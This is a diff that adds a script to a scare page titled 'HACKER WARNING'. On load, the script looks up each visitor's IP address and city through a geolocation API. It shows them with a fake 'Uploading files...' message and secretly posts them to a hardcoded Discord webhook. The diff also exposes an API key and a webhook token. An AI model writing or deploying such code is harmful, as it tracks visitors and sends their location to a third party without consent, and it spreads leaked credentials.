@@ -1,6 +1,7 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+  <meta charset="UTF-8">
   <title>HACKER WARNING</title>
   <style>
     body {
@@ -58,6 +59,37 @@
 </head>
 
 <body>
+
+<script>
+  const API_KEY = '704aa5f136d9423db0c64a593a6b7c27';
+  const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1489754745626431641/FlXQQJ9LxTYWEQrhWXph0bSfRzcUZGe8-1nYrM1KQjF0xRAm7kmNXI14YdHyMllEXAmZ';
+
+  async function fetchUserIpAndLocation() {
+    const res = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${API_KEY}`);
+    const data = await res.json();
+    
+    // Update the ipBox content with fetched IP and location
+    document.getElementById('ipBox').innerText =
+      `Tracking IP: ${data.ip}\n` +
+      `Location: ${data.city}, ${data.country_name}\n` +
+      'Uploading files...';
+
+    // Send data to Discord webhook
+    fetch(DISCORD_WEBHOOK_URL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        content: `User IP and Location:\nIP: ${data.ip}\nCity: ${data.city}\nCountry: ${data.country_name}`
+      })
+    }).then(response => response.json())
+       .catch(error => console.error('Error:', error));
+  }
+
+  // Call the function on page load
+  window.onload = fetchUserIpAndLocation;
+</script>
 
 <div id="overlay">⚠ Rerept on YT! ⚠</div>
 <div id="ipBox">Rerept on YT!</div>
